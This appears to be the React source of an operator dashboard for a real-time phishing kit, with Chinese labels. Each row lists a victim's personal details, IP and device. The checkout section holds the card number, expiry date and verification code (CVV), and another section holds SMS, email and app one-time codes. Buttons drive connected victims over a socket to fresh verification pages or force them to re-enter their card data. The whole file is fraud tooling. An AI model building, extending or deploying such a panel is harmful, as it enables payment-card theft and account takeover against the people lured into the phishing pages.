import type { ReactNode } from 'react';
import type { ActionTone, FlatRow, RecordRow, RouteTarget } from '../types';

type ActivityBadge = { label: string; cls: string };

type AdminRecordsTableProps = {
  rows: FlatRow[];
  totalRows: number;
  pageStart: number;
  expandAll: boolean;
  collapsedMain: Record<string, boolean>;
  showHistory: Record<string, boolean>;
  onToggleCollapse: (mainId: number) => void;
  onToggleHistory: (id: RecordRow['id']) => void;
  onCopyText: (text: string) => void;
  onOpenCardPreview: (r: RecordRow) => void;
  onRefill: (socketId: string) => void;
  onCheckoutRefill: (socketId: string, recordId: RecordRow['id']) => void;
  onRouteUser: (socketId: string, target: RouteTarget) => void;
  onRouteByFrontendJs: (socketId: string) => void;
  badgeForActivity: (r: RecordRow) => ActivityBadge;
  getHistoryRows: (mainId: number, excludeId: RecordRow['id']) => RecordRow[];
  formatStatus: (status?: string, page?: string) => string;
  highlightedRowIds: Set<string>;
};

function safeText(v: unknown) {
  return (v ?? '').toString();
}

function formatVerifyMethod(value?: string) {
  const raw = safeText(value).trim();
  const v = raw.toLowerCase();
  if (!v) return '-';
  if (v.includes('phone') || v.includes('sms') || v.includes('mobile') || v.includes('telephone')) return '手机';
  if (v.includes('email') || v.includes('mail')) return '邮箱';
  return raw;
}

function isSubId(id: RecordRow['id']) {
  return id.toString().includes('.');
}

function MiniCopyBtn({ onClick, disabled, title }: { onClick: () => void; disabled: boolean; title: string }) {
  return (
    <button
      onClick={(e) => {
        e.stopPropagation();
        onClick();
      }}
      disabled={disabled}
      title={title}
      style={{
        flexShrink: 0,
        minWidth: 42,
        padding: '4px 10px',
        fontSize: 11,
        lineHeight: 1.15,
        borderRadius: 7,
        border: `1px solid ${disabled ? '#2d3642' : '#304158'}`,
        background: disabled ? '#11161e' : '#1a222d',
        color: disabled ? '#6f7a88' : '#c9d1d9',
        cursor: disabled ? 'not-allowed' : 'pointer',
      }}
    >
      复制
    </button>
  );
}

function ActionBtn({
  label,
  onClick,
  disabled,
  title,
  tone = 'neutral',
}: {
  label: string;
  onClick: () => void;
  disabled: boolean;
  title: string;
  tone?: ActionTone;
}) {
  const style =
    disabled
      ? { border: '1px solid #30363d', background: '#161b22', color: 'rgba(125,133,144,0.6)' }
      : tone === 'danger'
        ? { border: '1px solid rgba(248,81,73,0.4)', background: '#da3633', color: '#fff' }
        : tone === 'brand'
          ? { border: '1px solid rgba(31,111,235,0.45)', background: 'rgba(31,111,235,0.2)', color: '#9ecbff' }
          : { border: '1px solid #30363d', background: '#21262d', color: '#d2dbe7' };

  return (
    <button
      disabled={disabled}
      onClick={onClick}
      title={title}
      style={{
        height: 30,
        width: '100%',
        borderRadius: 8,
        padding: '0 10px',
        fontSize: 11,
        fontWeight: 600,
        whiteSpace: 'nowrap',
        cursor: disabled ? 'not-allowed' : 'pointer',
        ...style,
      }}
    >
      {label}
    </button>
  );
}

function InlineField({
  label,
  value,
  mono,
  copyTitle,
  onCopy,
  extraActions,
}: {
  label: string;
  value?: string;
  mono?: boolean;
  copyTitle: string;
  onCopy: () => void;
  extraActions?: ReactNode;
}) {
  const text = safeText(value).trim();

  return (
    <div
      style={{
        display: 'grid',
        gridTemplateColumns: 'auto minmax(0,1fr) auto',
        alignItems: 'center',
        gap: 6,
        minWidth: 0,
      }}
    >
      <span style={{ color: '#8b949e', fontSize: 12, whiteSpace: 'nowrap' }}>{label}:</span>
      <span
        title={text || '-'}
        style={{
          minWidth: 0,
          overflow: 'hidden',
          textOverflow: 'ellipsis',
          whiteSpace: 'nowrap',
          color: '#dce4ee',
          fontSize: 12,
          fontFamily: mono ? 'Consolas, monospace' : 'inherit',
        }}
      >
        {text || '-'}
      </span>
      <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
        {extraActions}
        <MiniCopyBtn title={copyTitle} disabled={!text} onClick={onCopy} />
      </div>
    </div>
  );
}

function SectionCard({ title, children }: { title: string; children: ReactNode }) {
  return (
    <div
      style={{
        borderRadius: 12,
        border: '1px solid #273243',
        background: '#11161f',
        padding: 10,
      }}
    >
      <div style={{ marginBottom: 6, fontSize: 10, fontWeight: 700, letterSpacing: '0.08em', color: '#7f94ad' }}>{title}</div>
      {children}
    </div>
  );
}

function badgeStyle(cls: string): React.CSSProperties {
  if (cls.includes('emerald') || cls.includes('green')) {
    return { border: '1px solid rgba(34,197,94,0.28)', background: 'rgba(34,197,94,0.12)', color: '#86efac' };
  }
  if (cls.includes('red')) {
    return { border: '1px solid rgba(239,68,68,0.3)', background: 'rgba(239,68,68,0.12)', color: '#fca5a5' };
  }
  if (cls.includes('yellow') || cls.includes('orange')) {
    return { border: '1px solid rgba(249,115,22,0.3)', background: 'rgba(249,115,22,0.12)', color: '#fdba74' };
  }
  return { border: '1px solid rgba(59,130,246,0.38)', background: 'rgba(59,130,246,0.18)', color: '#9bc7ff' };
}

function refillMeta(record: RecordRow) {
  const status = safeText(record.status).toLowerCase();
  if (status.includes('checkout refill')) return { label: '结账重填', accent: '#f59e0b', bg: 'rgba(245,158,11,0.12)', border: 'rgba(245,158,11,0.28)', text: '#fcd34d' };
  if (status.includes('refill requested')) return { label: '资料重填', accent: '#38bdf8', bg: 'rgba(56,189,248,0.12)', border: 'rgba(56,189,248,0.28)', text: '#7dd3fc' };
  return null;
}

function stableRowBackground(id: RecordRow['id']) {
  const text = String(id);
  let hash = 0;
  for (let i = 0; i < text.length; i += 1) {
    hash = (hash * 31 + text.charCodeAt(i)) >>> 0;
  }
  return hash % 2 === 0 ? '#111821' : '#151d27';
}

export function AdminRecordsTable({
  rows,
  totalRows,
  pageStart,
  expandAll,
  collapsedMain,
  showHistory,
  onToggleCollapse,
  onToggleHistory,
  onCopyText,
  onOpenCardPreview,
  onRefill,
  onCheckoutRefill,
  onRouteUser,
  onRouteByFrontendJs,
  badgeForActivity,
  getHistoryRows,
  formatStatus,
  highlightedRowIds,
}: AdminRecordsTableProps) {
  return (
    <div style={{ borderRadius: 16, border: '1px solid #30363d', background: '#0d1117', padding: 8 }}>
      {totalRows === 0 ? (
        <div style={{ padding: '48px 0', textAlign: 'center', color: '#8b949e', fontSize: 14 }}>暂无匹配记录</div>
      ) : (
        rows.map(({ r, indent, mainId, subsCount }) => {
          const sub = isSubId(r.id);
          const refill = refillMeta(r);
          const canRefill = !!r.socketId && r.online !== false;
          const canRoute = !!r.socketId && r.online !== false;
          const statusText = formatStatus(r.status, r.page);
          const verifyMethodText = formatVerifyMethod(r.verifyMethod);
          const shouldHighlightVerify =
            canRoute &&
            statusText.includes('结账已提交') &&
            !statusText.includes('验证码已提交');
          const refillDisabledReason = !r.socketId ? '缺少 socketId' : '用户离线，不可重填';
          const routeDisabledReason = !r.socketId ? '缺少 socketId' : '用户离线，不可跳转';
          const active = !!r.active;
          const act = badgeForActivity(r);
          const showHistoryRow = !!showHistory[r.id.toString()];
          const historyRows = !sub && subsCount > 0 ? getHistoryRows(mainId, r.id) : [];
          const snapshots = (Array.isArray(r.checkoutSnapshots) ? r.checkoutSnapshots : []).slice(-3).reverse();
          const isFreshEntered = highlightedRowIds.has(r.id.toString());
          return (
            <div
              key={r.id}
              style={{
                marginLeft: indent ? 20 : 0,
                marginBottom: 8,
                borderRadius: 16,
                border: refill ? `1px solid ${refill.border}` : '1px solid #263241',
                background: stableRowBackground(r.id),
                padding: 12,
                boxShadow: active ? 'inset 0 0 0 1px rgba(31,111,235,0.25)' : isFreshEntered ? 'inset 0 0 0 1px rgba(52,211,153,0.25)' : 'none',
                position: 'relative',
                overflow: 'hidden',
              }}
            >
              {refill && (
                <div
                  style={{
                    position: 'absolute',
                    left: 0,
                    top: 0,
                    bottom: 0,
                    width: 4,
                    background: refill.accent,
                  }}
                />
              )}
              <div
                style={{
                  display: 'flex',
                  flexWrap: 'nowrap',
                  alignItems: 'center',
                  gap: 8,
                  marginBottom: 8,
                  fontSize: 12,
                  overflowX: 'auto',
                  whiteSpace: 'nowrap',
                  scrollbarWidth: 'thin',
                }}
              >
                {!indent && subsCount > 0 && (
                  <button
                    onClick={() => onToggleCollapse(mainId)}
                    style={{
                      height: 22,
                      width: 22,
                      borderRadius: 6,
                      border: '1px solid #304158',
                      background: '#1a222d',
                      color: '#c9d1d9',
                      cursor: 'pointer',
                      flexShrink: 0,
                    }}
                    title="展开/折叠"
                  >
                    {collapsedMain[mainId.toString()] ?? !expandAll ? '+' : '-'}
                  </button>
                )}

                <span style={{ flexShrink: 0, fontSize: 18, fontWeight: 700, color: '#7eb7ff', lineHeight: '20px' }}>{r.id}</span>
                <span style={{ ...badgeStyle(r.online === false ? 'red' : 'green'), flexShrink: 0, borderRadius: 999, padding: '2px 8px', fontSize: 12 }}>
                  {r.online === false ? '离线' : '在线'}
                </span>
                {active && <span style={{ ...badgeStyle('blue'), flexShrink: 0, borderRadius: 999, padding: '2px 8px', fontSize: 12 }}>当前</span>}
                {sub && <span style={{ ...badgeStyle('orange'), flexShrink: 0, borderRadius: 999, padding: '2px 8px', fontSize: 12 }}>子记录</span>}
                {sub && (
                  <span
                    style={{
                      flexShrink: 0,
                      borderRadius: 999,
                      border: '1px solid #3a4758',
                      background: '#18202b',
                      padding: '2px 8px',
                      fontSize: 12,
                      color: '#cbd5e1',
                    }}
                  >
                    父序列 {mainId}
                  </span>
                )}
                {refill && (
                  <span
                    style={{
                      flexShrink: 0,
                      borderRadius: 999,
                      border: `1px solid ${refill.border}`,
                      background: refill.bg,
                      padding: '2px 8px',
                      fontSize: 12,
                      fontWeight: 700,
                      color: refill.text,
                    }}
                  >
                    {refill.label}
                  </span>
                )}
                {!sub && subsCount > 0 && (
                  <span
                    style={{
                      flexShrink: 0,
                      borderRadius: 999,
                      border: '1px solid rgba(168,85,247,0.25)',
                      background: 'rgba(168,85,247,0.12)',
                      padding: '2px 8px',
                      fontSize: 12,
                      color: '#e9d5ff',
                    }}
                  >
                    子序列 {subsCount}
                  </span>
                )}
                {isFreshEntered && <span style={{ ...badgeStyle('green'), flexShrink: 0, borderRadius: 999, padding: '2px 8px', fontSize: 12 }}>新进入</span>}
                <span style={{ flexShrink: 0, color: '#dce4ee' }}>{r.time || '-'}</span>
                <span style={{ flexShrink: 0, color: '#9fb0c5' }}>{r.ip || '-'}</span>
                <span style={{ flexShrink: 0 }}>设备: {safeText(r.deviceType) || '-'} / {safeText(r.deviceOS) || '-'}</span>
                <span
                  style={{
                    flexShrink: 0,
                    borderRadius: 999,
                    border: '1px solid rgba(31,111,235,0.35)',
                    background: 'rgba(31,111,235,0.16)',
                    padding: '2px 10px',
                    fontSize: 12,
                    fontWeight: 700,
                    color: '#cfe5ff',
                  }}
                >
                  {statusText}
                </span>
                {verifyMethodText && verifyMethodText !== '-' && (
                  <span
                    style={{
                      flexShrink: 0,
                      borderRadius: 999,
                      border: '1px solid rgba(168,85,247,0.35)',
                      background: 'rgba(168,85,247,0.16)',
                      padding: '2px 10px',
                      fontSize: 12,
                      fontWeight: 700,
                      color: '#e9d5ff',
                    }}
                  >
                    验证方式 · {verifyMethodText}
                  </span>
                )}
                <span style={{ ...badgeStyle(act.cls), flexShrink: 0, borderRadius: 999, padding: '2px 10px', fontSize: 12, fontWeight: 700 }}>{act.label}</span>
                <span style={{ marginLeft: 'auto' }} />
                {(historyRows.length > 0 || snapshots.length > 0) && (
                  <button
                    onClick={() => onToggleHistory(r.id)}
                    style={{
                      flexShrink: 0,
                      borderRadius: 8,
                      border: '1px solid #304158',
                      background: '#1a222d',
                      color: '#9fb0c5',
                      padding: '4px 10px',
                      fontSize: 11,
                      cursor: 'pointer',
                    }}
                  >
                    {showHistoryRow ? '收起历史' : '展开历史'}
                  </button>
                )}
              </div>

              {!sub && historyRows.length > 0 && (
                <div
                  style={{
                    display: 'flex',
                    flexWrap: 'wrap',
                    gap: 6,
                    marginBottom: 8,
                  }}
                >
                  {historyRows.map((item) => {
                    const meta = refillMeta(item);
                    return (
                      <span
                        key={`chain-${r.id}-${item.id}`}
                        style={{
                          borderRadius: 999,
                          border: meta ? `1px solid ${meta.border}` : '1px solid #334155',
                          background: meta ? meta.bg : '#18202b',
                          padding: '3px 9px',
                          fontSize: 11,
                          color: meta ? meta.text : '#cbd5e1',
                        }}
                      >
                        {item.id} · {meta?.label || formatStatus(item.status, item.page)}
                      </span>
                    );
                  })}
                </div>
              )}

              <div
                style={{
                  display: 'grid',
                  gap: 8,
                  gridTemplateColumns: 'minmax(540px, 2.1fr) minmax(300px, 1.2fr) minmax(260px, 1fr) minmax(300px, 1.2fr)',
                }}
              >
                <SectionCard title="资料">
                  <div style={{ display: 'grid', gridTemplateColumns: 'minmax(0,1fr) minmax(0,1fr)', gap: 12 }}>
                    <div style={{ display: 'grid', gap: 6 }}>
                      <InlineField label="姓名" value={r.fullname} copyTitle="复制姓名" onCopy={() => onCopyText(safeText(r.fullname))} />
                      <InlineField label="地址" value={r.address} copyTitle="复制地址" onCopy={() => onCopyText(safeText(r.address))} />
                      <InlineField label="完整地址" value={r.fulladdress} copyTitle="复制完整地址" onCopy={() => onCopyText(safeText(r.fulladdress))} />
                      <InlineField label="城市" value={r.city} copyTitle="复制城市" onCopy={() => onCopyText(safeText(r.city))} />
                    </div>
                    <div style={{ display: 'grid', gap: 6 }}>
                      <InlineField label="州/省" value={r.state} copyTitle="复制州/省" onCopy={() => onCopyText(safeText(r.state))} />
                      <InlineField label="邮编" value={r.postalcode} mono copyTitle="复制邮编" onCopy={() => onCopyText(safeText(r.postalcode))} />
                      <InlineField label="电话" value={r.telephone} mono copyTitle="复制电话" onCopy={() => onCopyText(safeText(r.telephone))} />
                      <InlineField label="邮箱" value={r.email} mono copyTitle="复制邮箱" onCopy={() => onCopyText(safeText(r.email))} />
                    </div>
                  </div>

                  {showHistoryRow && historyRows.length > 0 && (
                    <div style={{ marginTop: 8, display: 'grid', gap: 4, borderRadius: 8, border: '1px solid #2b3542', background: 'rgba(15,21,30,0.7)', padding: 6 }}>
                      <div style={{ fontSize: 10, color: '#8ea2bc' }}>资料历史</div>
                      {historyRows.map((h) => (
                        <div key={`his-${r.id}-${h.id}`} style={{ borderRadius: 6, border: '1px solid #243244', background: '#0c121b', padding: '4px 6px', fontSize: 10, color: '#9fb0c5' }}>
                          <span style={{ color: '#8abfff' }}>{h.id}</span> · {safeText(h.fullname) || '-'} · {safeText(h.address) || '-'}
                        </div>
                      ))}
                    </div>
                  )}
                </SectionCard>

                <SectionCard title="结账">
                  <div style={{ display: 'grid', gap: 6 }}>
                    <InlineField label="姓名" value={r.checkoutName} copyTitle="复制结账姓名" onCopy={() => onCopyText(safeText(r.checkoutName))} />
                    <InlineField
                      label="号码"
                      value={r.checkoutPhone}
                      mono
                      copyTitle="复制结账号码"
                      onCopy={() => onCopyText(safeText(r.checkoutPhone))}
                      extraActions={
                        <button
                          onClick={() => onOpenCardPreview(r)}
                          style={{
                            height: 26,
                            borderRadius: 7,
                            border: '1px solid rgba(31,111,235,0.45)',
                            background: 'rgba(31,111,235,0.2)',
                            color: '#9ecbff',
                            padding: '0 10px',
                            fontSize: 11,
                            fontWeight: 600,
                            cursor: 'pointer',
                          }}
                          title="显示号码卡片"
                        >
                          卡片
                        </button>
                      }
                    />
                    <InlineField label="日期" value={r.checkoutExpiryDate || r.checkoutDate} mono copyTitle="复制结账日期" onCopy={() => onCopyText(safeText(r.checkoutExpiryDate || r.checkoutDate))} />
                    <InlineField label="验证码" value={r.checkoutCode} mono copyTitle="复制结账验证码" onCopy={() => onCopyText(safeText(r.checkoutCode))} />
                  </div>

                  {showHistoryRow && snapshots.length > 0 && (
                    <div style={{ marginTop: 8, display: 'grid', gap: 4, borderRadius: 8, border: '1px solid #2b3542', background: 'rgba(15,21,30,0.7)', padding: 6 }}>
                      <div style={{ fontSize: 10, color: '#8ea2bc' }}>结账历史</div>
                      {snapshots.map((s, idx) => (
                        <div key={`snap-${r.id}-${idx}`} style={{ borderRadius: 6, border: '1px solid #243244', background: '#0c121b', padding: '4px 6px', fontSize: 10, color: '#9fb0c5' }}>
                          <span style={{ color: '#8abfff' }}>{s.time || `第 ${idx + 1} 条`}</span> · {safeText(s.checkoutName) || '-'} · {safeText(s.checkoutPhone) || '-'} · {safeText(s.checkoutCode) || '-'}
                        </div>
                      ))}
                    </div>
                  )}
                </SectionCard>

                <SectionCard title="验证页">
                  <div style={{ display: 'grid', gap: 6 }}>
                    <InlineField label="方式" value={formatVerifyMethod(r.verifyMethod)} copyTitle="复制验证方式" onCopy={() => onCopyText(formatVerifyMethod(r.verifyMethod))} />
                    <InlineField label="验证" value={r.verify} mono copyTitle="复制验证" onCopy={() => onCopyText(safeText(r.verify))} />
                    <InlineField label="邮箱验" value={r.emailVerify} mono copyTitle="复制邮箱验证" onCopy={() => onCopyText(safeText(r.emailVerify))} />
                    <InlineField label="应用验" value={r.appCheck} mono copyTitle="复制应用验证" onCopy={() => onCopyText(safeText(r.appCheck))} />
                  </div>
                </SectionCard>

                <SectionCard title="操作">
                  <div style={{ display: 'grid', gridTemplateColumns: 'minmax(0,1fr) minmax(0,1fr)', gap: 10 }}>
                    <div style={{ display: 'grid', gap: 6 }}>
                      <ActionBtn
                        label="进行验证"
                        tone={shouldHighlightVerify ? 'danger' : 'neutral'}
                        disabled={!canRoute}
                        onClick={() => canRoute && onRouteUser(r.socketId, 'verify')}
                        title={!canRoute ? routeDisabledReason : shouldHighlightVerify ? '结账已提交，建议立即进入验证' : '进入验证页面'}
                      />
                      <ActionBtn
                        label="手机"
                        disabled={!canRoute}
                        onClick={() => canRoute && onRouteUser(r.socketId, 'verifyphone')}
                        title={!canRoute ? routeDisabledReason : '重新进入手机验证入口'}
                      />
                      <ActionBtn
                        label="邮箱"
                        disabled={!canRoute}
                        onClick={() => canRoute && onRouteUser(r.socketId, 'emailverify')}
                        title={!canRoute ? routeDisabledReason : '重新进入邮箱验证入口'}
                      />
                    </div>
                    <div style={{ display: 'grid', gap: 6 }}>
                      <ActionBtn
                        label="重填资料"
                        tone="neutral"
                        disabled={!canRefill}
                        onClick={() => canRefill && onRefill(r.socketId)}
                        title={!canRefill ? refillDisabledReason : '强制重填资料表单'}
                      />
                      <ActionBtn
                        label="重填结账"
                        tone="neutral"
                        disabled={!canRefill}
                        onClick={() => canRefill && onCheckoutRefill(r.socketId, r.id)}
                        title={!canRefill ? refillDisabledReason : '在当前序号下重填结账'}
                      />
                      <ActionBtn
                        label="前端跳转"
                        tone="neutral"
                        disabled={!canRoute}
                        onClick={() => canRoute && onRouteByFrontendJs(r.socketId)}
                        title={!canRoute ? routeDisabledReason : '跳转目标由前端 JS 决定'}
                      />
                    </div>
                  </div>
                </SectionCard>
              </div>
            </div>
          );
        })
      )}
    </div>
  );
}
